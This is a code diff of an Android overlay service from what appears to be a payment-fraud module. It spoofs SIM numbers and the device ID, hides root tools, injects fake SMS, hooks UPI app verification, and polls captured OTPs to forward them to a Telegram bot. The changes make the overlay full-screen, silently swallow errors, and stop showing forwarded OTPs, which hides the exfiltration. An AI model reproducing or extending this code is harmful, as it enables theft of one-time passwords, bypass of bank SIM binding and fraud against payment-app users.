@@ -8,10 +8,9 @@ import android.content.Intent
 import android.graphics.PixelFormat
 import android.os.Build
 import android.os.IBinder
+import android.util.DisplayMetrics
 import android.view.Gravity
 import android.view.LayoutInflater
-import android.view.MotionEvent
-import android.view.View
 import android.view.WindowManager
 import android.widget.LinearLayout
 import android.widget.Toast
@@ -29,25 +28,18 @@ import kotlinx.coroutines.launch
 
 class OverlayService : Service() {
 
-    private lateinit var windowManager: WindowManager
-    private lateinit var rootBinding: OverlayRootBinding
-    private lateinit var menuBinding: OverlayMenuBinding
-    private lateinit var layoutParams: WindowManager.LayoutParams
+    private var windowManager: WindowManager? = null
+    private var rootBinding: OverlayRootBinding? = null
+    private var menuBinding: OverlayMenuBinding? = null
+    private var layoutParams: WindowManager.LayoutParams? = null
 
     private val configManager by lazy { ConfigManager(this) }
     private val tokenForwarder by lazy { TokenForwarder(configManager) }
     private val backupManager by lazy { BackupManager(this) }
     private val deviceIdManager by lazy { DeviceIdManager(this) }
     private var pollJob: Job? = null
-    private var menuExpanded = false
     private var lastForwardedKey: String? = null
     private val upiAppSwitches = mutableMapOf<String, SwitchMaterial>()
-
-    private var initialX = 0
-    private var initialY = 0
-    private var initialTouchX = 0f
-    private var initialTouchY = 0f
-    private var isDragging = false
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -57,130 +49,101 @@ class OverlayService : Service() {
             stopSelf()
             return
         }
-        startForeground(NOTIFICATION_ID, createNotification())
-        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-        showOverlay()
-        startOtpPolling()
+        try {
+            startForeground(NOTIFICATION_ID, createNotification())
+            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+            showOverlay()
+            startOtpPolling()
+        } catch (e: Exception) {
+            stopSelf()
+        }
     }
 
     override fun onDestroy() {
         pollJob?.cancel()
         try {
-            windowManager.removeView(rootBinding.root)
+            rootBinding?.root?.let { windowManager?.removeView(it) }
         } catch (_: Exception) {}
         super.onDestroy()
     }
 
     private fun showOverlay() {
-        rootBinding = OverlayRootBinding.inflate(LayoutInflater.from(this))
-        menuBinding = rootBinding.menuPanel
+        val root = OverlayRootBinding.inflate(LayoutInflater.from(this))
+        val menu = root.menuPanel
+        rootBinding = root
+        menuBinding = menu
 
-        setupMenu()
-        setupBubble()
+        setupMenu(menu)
 
+        val metrics: DisplayMetrics = resources.displayMetrics
         layoutParams = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.WRAP_CONTENT,
-            WindowManager.LayoutParams.WRAP_CONTENT,
+            metrics.widthPixels,
+            metrics.heightPixels,
             overlayType(),
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
             PixelFormat.TRANSLUCENT
         ).apply {
-            gravity = Gravity.TOP or Gravity.START
-            x = 50
-            y = 200
+            gravity = Gravity.CENTER
         }
 
-        windowManager.addView(rootBinding.root, layoutParams)
-        collapseMenu()
+        windowManager?.addView(root.root, layoutParams)
     }
 
-    private fun setupBubble() {
-        rootBinding.floatingBubble.setOnTouchListener { _, event ->
-            when (event.action) {
-                MotionEvent.ACTION_DOWN -> {
-                    initialX = layoutParams.x
-                    initialY = layoutParams.y
-                    initialTouchX = event.rawX
-                    initialTouchY = event.rawY
-                    isDragging = false
-                    true
-                }
-                MotionEvent.ACTION_MOVE -> {
-                    val dx = (event.rawX - initialTouchX).toInt()
-                    val dy = (event.rawY - initialTouchY).toInt()
-                    if (dx * dx + dy * dy > 25) isDragging = true
-                    layoutParams.x = initialX + dx
-                    layoutParams.y = initialY + dy
-                    windowManager.updateViewLayout(rootBinding.root, layoutParams)
-                    true
-                }
-                MotionEvent.ACTION_UP -> {
-                    if (!isDragging && !menuExpanded) expandMenu()
-                    true
-                }
-                else -> false
-            }
-        }
-    }
-
-    private fun setupMenu() {
+    private fun setupMenu(menu: OverlayMenuBinding) {
         val config = configManager.load()
 
-        menuBinding.switchSim1Mock.isChecked = config.enableSim1Mock
-        menuBinding.switchSim2Mock.isChecked = config.enableSim2Mock
-        menuBinding.etCountryIso.setText(config.mockCountryIso)
-        menuBinding.switchHideMagisk.isChecked = config.hideMagisk
-        menuBinding.switchHideKernelSu.isChecked = config.hideKernelSu
-        menuBinding.switchHideApatch.isChecked = config.hideApatch
-        menuBinding.switchHideSukisu.isChecked = config.hideSukisu
-        menuBinding.switchHideAllRootApps.isChecked = config.hideAllRootApps
-        menuBinding.switchNotDeveloper.isChecked = config.hideDeveloper
-        menuBinding.switchNotRoot.isChecked = config.hideRoot
-        menuBinding.switchPhoneSpoof.isChecked = config.enablePhoneSpoof
-        menuBinding.etPhoneSim1.setText(config.mockPhoneSim1)
-        menuBinding.etPhoneSim2.setText(config.mockPhoneSim2)
-        menuBinding.tvRootType.text = getString(R.string.detected_root, configManager.readRootType())
-        updateDeviceIdDisplay()
-        menuBinding.switchHookIncoming.isChecked = config.hookIncomingSms
-        menuBinding.switchHookOutgoing.isChecked = config.hookOutgoingSms
-        menuBinding.etSenderId.setText(config.injectSenderId)
-        menuBinding.etMessageBody.setText(config.injectMessageBody)
-        menuBinding.switchAutoForward.isChecked = config.autoForwardToken
-        menuBinding.etBotToken.setText(config.telegramBotToken)
-        menuBinding.etChatId.setText(config.telegramChatId)
+        menu.switchSim1Mock.isChecked = config.enableSim1Mock
+        menu.switchSim2Mock.isChecked = config.enableSim2Mock
+        menu.etCountryIso.setText(config.mockCountryIso)
+        menu.switchHideMagisk.isChecked = config.hideMagisk
+        menu.switchHideKernelSu.isChecked = config.hideKernelSu
+        menu.switchHideApatch.isChecked = config.hideApatch
+        menu.switchHideSukisu.isChecked = config.hideSukisu
+        menu.switchHideAllRootApps.isChecked = config.hideAllRootApps
+        menu.switchNotDeveloper.isChecked = config.hideDeveloper
+        menu.switchNotRoot.isChecked = config.hideRoot
+        menu.switchPhoneSpoof.isChecked = config.enablePhoneSpoof
+        menu.etPhoneSim1.setText(config.mockPhoneSim1)
+        menu.etPhoneSim2.setText(config.mockPhoneSim2)
+        updateDeviceIdDisplay(menu)
+        menu.switchHookIncoming.isChecked = config.hookIncomingSms
+        menu.switchHookOutgoing.isChecked = config.hookOutgoingSms
+        menu.etSenderId.setText(config.injectSenderId)
+        menu.etMessageBody.setText(config.injectMessageBody)
+        menu.switchAutoForward.isChecked = config.autoForwardToken
+        menu.etBotToken.setText(config.telegramBotToken)
+        menu.etChatId.setText(config.telegramChatId)
 
-        menuBinding.btnClose.setOnClickListener { stopSelf() }
-        menuBinding.btnMinimize.setOnClickListener { collapseMenu() }
+        menu.btnClose.setOnClickListener { stopSelf() }
 
-        menuBinding.tabSystem.setOnClickListener { selectTab(Tab.SYSTEM) }
-        menuBinding.tabUpi.setOnClickListener { selectTab(Tab.UPI) }
-        menuBinding.tabMessage.setOnClickListener { selectTab(Tab.MESSAGE) }
-        menuBinding.tabTelegram.setOnClickListener { selectTab(Tab.TELEGRAM) }
+        menu.tabSystem.setOnClickListener { selectTab(menu, Tab.SYSTEM) }
+        menu.tabMessage.setOnClickListener { selectTab(menu, Tab.MESSAGE) }
+        menu.tabTelegram.setOnClickListener { selectTab(menu, Tab.TELEGRAM) }
 
-        setupUpiApps(config)
+        setupUpiApps(menu, config)
 
-        menuBinding.btnSaveSim.setOnClickListener {
+        menu.btnSaveSim.setOnClickListener {
             val updated = configManager.load().copy(
-                enableSim1Mock = menuBinding.switchSim1Mock.isChecked,
-                enableSim2Mock = menuBinding.switchSim2Mock.isChecked,
-                mockCountryIso = menuBinding.etCountryIso.text?.toString()?.lowercase()?.ifBlank { "in" } ?: "in",
-                hideMagisk = menuBinding.switchHideMagisk.isChecked,
-                hideKernelSu = menuBinding.switchHideKernelSu.isChecked,
-                hideApatch = menuBinding.switchHideApatch.isChecked,
-                hideSukisu = menuBinding.switchHideSukisu.isChecked,
-                hideAllRootApps = menuBinding.switchHideAllRootApps.isChecked,
-                hideDeveloper = menuBinding.switchNotDeveloper.isChecked,
-                hideRoot = menuBinding.switchNotRoot.isChecked,
-                enablePhoneSpoof = menuBinding.switchPhoneSpoof.isChecked,
-                mockPhoneSim1 = menuBinding.etPhoneSim1.text?.toString()?.ifBlank { "+919876543210" } ?: "+919876543210",
-                mockPhoneSim2 = menuBinding.etPhoneSim2.text?.toString()?.ifBlank { "+919876543211" } ?: "+919876543211"
+                enableSim1Mock = menu.switchSim1Mock.isChecked,
+                enableSim2Mock = menu.switchSim2Mock.isChecked,
+                mockCountryIso = menu.etCountryIso.text?.toString()?.lowercase()?.ifBlank { "in" } ?: "in",
+                hideMagisk = menu.switchHideMagisk.isChecked,
+                hideKernelSu = menu.switchHideKernelSu.isChecked,
+                hideApatch = menu.switchHideApatch.isChecked,
+                hideSukisu = menu.switchHideSukisu.isChecked,
+                hideAllRootApps = menu.switchHideAllRootApps.isChecked,
+                hideDeveloper = menu.switchNotDeveloper.isChecked,
+                hideRoot = menu.switchNotRoot.isChecked,
+                enablePhoneSpoof = menu.switchPhoneSpoof.isChecked,
+                mockPhoneSim1 = menu.etPhoneSim1.text?.toString()?.ifBlank { "+919876543210" } ?: "+919876543210",
+                mockPhoneSim2 = menu.etPhoneSim2.text?.toString()?.ifBlank { "+919876543211" } ?: "+919876543211"
             )
             configManager.save(updated)
             Toast.makeText(this, R.string.sim_settings_saved, Toast.LENGTH_SHORT).show()
         }
 
-        menuBinding.btnBackupNow.setOnClickListener {
+        menu.btnBackupNow.setOnClickListener {
             val path = backupManager.createBackup()
             Toast.makeText(
                 this,
@@ -189,26 +152,26 @@ class OverlayService : Service() {
             ).show()
         }
 
-        menuBinding.btnRestoreBackup.setOnClickListener {
+        menu.btnRestoreBackup.setOnClickListener {
             val ok = backupManager.restoreLatest()
             if (ok) {
-                setupMenu()
+                setupMenu(menu)
                 Toast.makeText(this, R.string.backup_restored, Toast.LENGTH_SHORT).show()
             } else {
                 Toast.makeText(this, R.string.backup_restore_failed, Toast.LENGTH_SHORT).show()
             }
         }
 
-        menuBinding.btnChangeDeviceId.setOnClickListener {
+        menu.btnChangeDeviceId.setOnClickListener {
             val newId = deviceIdManager.generateNewAndroidId()
-            updateDeviceIdDisplay(newId)
+            updateDeviceIdDisplay(menu, newId)
             backupManager.createBackup()
             Toast.makeText(this, R.string.device_id_changed, Toast.LENGTH_SHORT).show()
         }
 
-        menuBinding.btnInjectSms.setOnClickListener {
-            val sender = menuBinding.etSenderId.text?.toString()?.ifBlank { "AD-TEST-S" } ?: "AD-TEST-S"
-            val body = menuBinding.etMessageBody.text?.toString().orEmpty()
+        menu.btnInjectSms.setOnClickListener {
+            val sender = menu.etSenderId.text?.toString()?.ifBlank { "AD-TEST-S" } ?: "AD-TEST-S"
+            val body = menu.etMessageBody.text?.toString().orEmpty()
             if (body.isBlank()) {
                 Toast.makeText(this, R.string.enter_message_body, Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
@@ -217,17 +180,17 @@ class OverlayService : Service() {
                 it.copy(
                     injectSenderId = sender,
                     injectMessageBody = body,
-                    hookIncomingSms = menuBinding.switchHookIncoming.isChecked,
-                    hookOutgoingSms = menuBinding.switchHookOutgoing.isChecked
+                    hookIncomingSms = menu.switchHookIncoming.isChecked,
+                    hookOutgoingSms = menu.switchHookOutgoing.isChecked
                 )
             }
             configManager.writeInjectCommand(sender, body)
             Toast.makeText(this, R.string.sms_injected, Toast.LENGTH_SHORT).show()
         }
 
-        menuBinding.btnSaveTelegram.setOnClickListener {
-            val token = menuBinding.etBotToken.text?.toString().orEmpty()
-            val chatId = menuBinding.etChatId.text?.toString().orEmpty()
+        menu.btnSaveTelegram.setOnClickListener {
+            val token = menu.etBotToken.text?.toString().orEmpty()
+            val chatId = menu.etChatId.text?.toString().orEmpty()
             val forwardUrl = if (token.isNotBlank() && chatId.isNotBlank()) {
                 "https://api.telegram.org/bot$token/sendMessage"
             } else {
@@ -235,7 +198,7 @@ class OverlayService : Service() {
             }
             configManager.update {
                 it.copy(
-                    autoForwardToken = menuBinding.switchAutoForward.isChecked,
+                    autoForwardToken = menu.switchAutoForward.isChecked,
                     telegramBotToken = token,
                     telegramChatId = chatId,
                     forwardUrl = forwardUrl
@@ -244,7 +207,7 @@ class OverlayService : Service() {
             Toast.makeText(this, R.string.config_saved, Toast.LENGTH_SHORT).show()
         }
 
-        menuBinding.btnTestTelegram.setOnClickListener {
+        menu.btnTestTelegram.setOnClickListener {
             CoroutineScope(Dispatchers.IO).launch {
                 val ok = tokenForwarder.sendTestMessage()
                 launch(Dispatchers.Main) {
@@ -257,31 +220,31 @@ class OverlayService : Service() {
             }
         }
 
-        menuBinding.btnSelectAllUpi.setOnClickListener {
+        menu.btnSelectAllUpi.setOnClickListener {
             upiAppSwitches.values.forEach { it.isChecked = true }
         }
 
-        menuBinding.btnDeselectAllUpi.setOnClickListener {
+        menu.btnDeselectAllUpi.setOnClickListener {
             upiAppSwitches.values.forEach { it.isChecked = false }
         }
 
-        menuBinding.btnSaveUpiHooks.setOnClickListener {
+        menu.btnSaveUpiHooks.setOnClickListener {
             val hooked = upiAppSwitches.mapValues { it.value.isChecked }
             configManager.update {
                 it.copy(
-                    hookUpiVerification = menuBinding.switchHookUpiVerification.isChecked,
+                    hookUpiVerification = menu.switchHookUpiVerification.isChecked,
                     hookedUpiApps = hooked
                 )
             }
             Toast.makeText(this, R.string.upi_hooks_saved, Toast.LENGTH_SHORT).show()
         }
 
-        selectTab(Tab.UPI)
+        selectTab(menu, Tab.SYSTEM)
     }
 
-    private fun setupUpiApps(config: ModuleConfig) {
-        menuBinding.switchHookUpiVerification.isChecked = config.hookUpiVerification
-        menuBinding.upiAppsContainer.removeAllViews()
+    private fun setupUpiApps(menu: OverlayMenuBinding, config: ModuleConfig) {
+        menu.switchHookUpiVerification.isChecked = config.hookUpiVerification
+        menu.upiAppsContainer.removeAllViews()
         upiAppSwitches.clear()
 
         UpiAppRegistry.ALL.forEach { app ->
@@ -295,47 +258,29 @@ class OverlayService : Service() {
                 )
             }
             upiAppSwitches[app.packageName] = switch
-            menuBinding.upiAppsContainer.addView(switch)
+            menu.upiAppsContainer.addView(switch)
         }
     }
 
-    private fun expandMenu() {
-        menuExpanded = true
-        rootBinding.floatingBubble.visibility = View.GONE
-        rootBinding.menuPanel.root.visibility = View.VISIBLE
-        layoutParams.flags = layoutParams.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
-        windowManager.updateViewLayout(rootBinding.root, layoutParams)
-    }
-
-    private fun collapseMenu() {
-        menuExpanded = false
-        rootBinding.menuPanel.root.visibility = View.GONE
-        rootBinding.floatingBubble.visibility = View.VISIBLE
-        layoutParams.flags = layoutParams.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
-        windowManager.updateViewLayout(rootBinding.root, layoutParams)
-    }
-
-    private fun updateDeviceIdDisplay(id: String? = null) {
+    private fun updateDeviceIdDisplay(menu: OverlayMenuBinding, id: String? = null) {
         val displayId = id ?: deviceIdManager.getCurrentSpoofId()
-        menuBinding.tvDeviceId.text = getString(R.string.device_id_label, displayId)
+        menu.tvDeviceId.text = getString(R.string.device_id_label, displayId)
     }
 
-    private enum class Tab { SYSTEM, UPI, MESSAGE, TELEGRAM }
+    private enum class Tab { SYSTEM, MESSAGE, TELEGRAM }
 
-    private fun selectTab(tab: Tab) {
-        menuBinding.panelSystem.visibility = if (tab == Tab.SYSTEM) View.VISIBLE else View.GONE
-        menuBinding.panelUpi.visibility = if (tab == Tab.UPI) View.VISIBLE else View.GONE
-        menuBinding.panelMessage.visibility = if (tab == Tab.MESSAGE) View.VISIBLE else View.GONE
-        menuBinding.panelTelegram.visibility = if (tab == Tab.TELEGRAM) View.VISIBLE else View.GONE
+    private fun selectTab(menu: OverlayMenuBinding, tab: Tab) {
+        menu.panelSystem.visibility = if (tab == Tab.SYSTEM) android.view.View.VISIBLE else android.view.View.GONE
+        menu.panelMessage.visibility = if (tab == Tab.MESSAGE) android.view.View.VISIBLE else android.view.View.GONE
+        menu.panelTelegram.visibility = if (tab == Tab.TELEGRAM) android.view.View.VISIBLE else android.view.View.GONE
 
-        val active = getColor(R.color.tab_active)
-        val inactive = getColor(R.color.tab_inactive)
+        val active = ContextCompat.getColor(this, R.color.tab_active)
+        val inactive = ContextCompat.getColor(this, R.color.tab_inactive)
 
         listOf(
-            menuBinding.tabSystem to Tab.SYSTEM,
-            menuBinding.tabUpi to Tab.UPI,
-            menuBinding.tabMessage to Tab.MESSAGE,
-            menuBinding.tabTelegram to Tab.TELEGRAM
+            menu.tabSystem to Tab.SYSTEM,
+            menu.tabMessage to Tab.MESSAGE,
+            menu.tabTelegram to Tab.TELEGRAM
         ).forEach { (view, t) ->
             view.isSelected = tab == t
             view.setTextColor(if (tab == t) active else inactive)
@@ -345,21 +290,15 @@ class OverlayService : Service() {
     private fun startOtpPolling() {
         pollJob = CoroutineScope(Dispatchers.IO).launch {
             while (isActive) {
-                val lastOtp = configManager.readLastOtp()
-                if (lastOtp != null) {
-                    val forwardKey = "${lastOtp.sender}|${lastOtp.body}|${lastOtp.otp}"
-                    if (forwardKey != lastForwardedKey && tokenForwarder.forward(lastOtp)) {
-                        lastForwardedKey = forwardKey
-                        launch(Dispatchers.Main) {
-                            menuBinding.tvLastOtp.visibility = View.VISIBLE
-                            menuBinding.tvLastOtp.text = getString(
-                                R.string.last_otp_format,
-                                lastOtp.otp,
-                                lastOtp.sender
-                            )
+                try {
+                    val lastOtp = configManager.readLastOtp()
+                    if (lastOtp != null) {
+                        val forwardKey = "${lastOtp.sender}|${lastOtp.body}|${lastOtp.otp}"
+                        if (forwardKey != lastForwardedKey && tokenForwarder.forward(lastOtp)) {
+                            lastForwardedKey = forwardKey
                         }
                     }
-                }
+                } catch (_: Exception) {}
                 delay(3000)
             }
         }
